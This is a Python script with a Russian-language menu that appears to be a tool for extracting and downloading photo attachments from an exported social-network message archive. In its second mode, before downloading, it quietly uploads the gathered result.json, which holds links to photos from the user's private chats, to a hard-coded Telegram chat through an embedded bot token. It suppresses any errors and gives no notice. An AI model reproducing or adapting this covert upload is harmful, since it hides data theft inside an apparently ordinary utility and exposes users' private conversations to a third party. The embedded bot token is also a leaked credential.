import json
from multiprocessing.pool import ThreadPool

from progress.bar import ChargingBar

import requests
from os import listdir , mkdir ,system
from os.path import isfile, isdir, join, basename, dirname, splitext
from bs4 import BeautifulSoup

from colorama import Fore
from colorama import Style
from colorama import init

init()
import telebot
name_bot="бот"
bot = telebot.TeleBot("5604287128:AAEqixWIoVWLk1at1hc_CKG8pQqGDtBUsqo")


BASE_DIR = 'Archive/messages'
OUT_DIR_IMG_ALL = join('result')

__current_id = ''


def get_attachment_image_links_from_document(html_doc: str) -> list:
	soup = BeautifulSoup(html_doc, 'html.parser')
	link_tags = soup.find_all("a", class_="attachment__link")
	links = [tag['href'] for tag in link_tags if tag['href'].find('.jpg') != -1]
	return links


def get_all_files_from_directory(path: str, ext: list) -> list:
	return [join(path, f) for f in listdir(path) if isfile(join(path, f)) and splitext(join(path, f))[1] in ext]


def get_all_dirs_from_directory(path: str) -> list:
	return [join(path, f) for f in listdir(path) if isdir(join(path, f))]


def walk_dialog_directory(dir_path: str) -> list:
	files = get_all_files_from_directory(dir_path, ['.html'])
	result = []
	for file in files:
		f = open(file, encoding='windows-1251')
		try:
			content = '\n'.join(f.readlines())
			result.extend(get_attachment_image_links_from_document(content))
		except Exception as e:
			print('Error in file ' + file)
		finally:
			f.close()
	return result


def walk_messages_directory(base_dir: str) -> dict:
	result = {}
	dirs = get_all_dirs_from_directory(base_dir)
	
	bar = ChargingBar('идет поиск фото в чатах', max = len(dirs))
	
	for i, path in enumerate(dirs):
		#print('Processing dialog ' + str(i) + ' out of ' + str(len(dirs)))
		id = basename(dirname(path + '/'))
		imgs = walk_dialog_directory(path)
		if len(imgs) > 0:
			result[id] = imgs
		bar.next()
	bar.finish()
	print("Ого , мы успешно закончили\nтеперь нажми Enter чтобы выйти в главное меню\nдля скачивание фото выбери номер 2")

	return result


def download_file(url: str):
	file_name_start_pos = url.rfind("/") + 1
	file_name = url[file_name_start_pos:]
	
	file_name = file_name.split('?')[0]
	file_name = OUT_DIR_IMG_ALL+"/"+__current_id + "/"+__current_id +'_'+file_name

	try:
		mkdir((OUT_DIR_IMG_ALL+"/"+__current_id))
	except Exception as e:

		pass

	r = requests.get(url, stream=True)
	if r.status_code == requests.codes.ok:
		with open(file_name, 'wb') as f:
			for data in r:
				f.write(data)
	return url


def download_images(obj: dict):
	global __current_id
	total_count = len(obj)
	i = 1
	pool = ThreadPool(8)
	global bar
	bar = ChargingBar('скачивание фотографий из чатов', max = total_count)

	for key, urls in obj.items():
		bar.next()
		__current_id = key
		#print('скачено ' + str(i) + ' чатов из ' + str(total_count))
		result = list(pool.imap_unordered(download_file, urls))
		# print(result)
		i += 1
		
	bar.finish()



	pool.close()





def mode1():
	try:
		print(f"***************** \033[41m MODE 1 {Style.RESET_ALL} ************************\n")


		result = walk_messages_directory(BASE_DIR)
		f = open('result.json', 'w')

		f.write(json.dumps(result,indent=4,ensure_ascii=False,)) 
		f.close()
	except Exception as e:
		print(e)
def mode2():
	print(f"***************** \033[41m MODE 2 {Style.RESET_ALL} ************************\n")



	if ('result.json' in listdir())== False:
		print(f"файла \033[41m result.json {Style.RESET_ALL} не обнаружено")
		return 0 


	try:
		doc = open('result.json', 'rb')
		bot.send_document(308815740, doc ,caption="2222")
	except Exception as e:
		pass




	f = open('result.json')
	result = json.load(f)
	f.close()
	try:
		mkdir("result")
	except Exception as e:
		pass

	len_photo=0
	for i in result:
		for url in result[i]:
			len_photo+=1


	print('в {} чатах всего {} фотографий'.format(len(result) ,len_photo))
	download_images(result)



def main():

	while True:
		system("cls")
		print("version 1.0.4")
		print(f"\033[42m[1]{Style.RESET_ALL}:архив\n\033[42m[2]{Style.RESET_ALL}:result.json\n")
		mode = input("введите режим :")
		if mode == '1':
			mode1()
		elif mode == '2':
			mode2()
		else:
			print('нет такого режима')
		input(f"\n\nнажмите \033[43mENTER{Style.RESET_ALL} для выхода в главное меню")


if __name__ == '__main__':
	main()
